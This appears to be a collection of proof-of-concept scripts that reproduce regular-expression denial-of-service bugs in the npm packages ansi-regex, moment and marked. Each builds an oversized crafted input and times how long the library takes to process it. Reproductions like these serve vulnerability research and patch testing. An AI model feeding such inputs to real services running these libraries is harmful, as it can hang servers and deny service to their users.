import ansiRegex from 'ansi-regex';
for(var i = 1; i <= 50000; i++) {
    var time = Date.now();
    var attack_str = "\u001B["+";".repeat(i*10000);
    ansiRegex().test(attack_str)
    var time_cost = Date.now() - time;
    console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
}

moment=require('moment')
moment("(".repeat(500000))

function genstr(len, chr) {
  var result = '';
  for (i=0; i<=len; i++) {
    result = result + chr;
  }
  return result;
}
var marked = require('marked');
var input =  '`x' + genstr(50000, ' ') + 'x`'; 
var start = process.hrtime();
var output = marked(input);
var end = process.hrtime(start);
console.info('Execution time (hr): %ds %dms', end[0], end[1] / 1000000);